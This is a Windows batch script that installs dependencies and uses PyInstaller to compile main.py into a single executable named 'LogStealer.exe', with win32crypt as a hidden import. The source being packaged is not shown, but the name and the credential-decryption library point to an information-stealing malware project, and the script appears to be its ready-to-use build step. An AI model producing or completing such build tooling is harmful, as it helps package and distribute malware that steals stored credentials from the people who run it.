@echo off
echo [1/3] Installing dependencies...
pip install -r requirements.txt

echo [2/3] Building Executable...
python -m PyInstaller --noconfirm --onefile --console --name "LogStealer" --hidden-import=win32timezone --hidden-import=win32crypt "main.py"

echo [3/3] Cleanup...
if exist "build" rmdir /s /q "build"
if exist "LogStealer.spec" del "LogStealer.spec"

echo.
echo Build Complete!
echo Your executable is located in the "dist" folder: dist\LogStealer.exe
echo.
pause
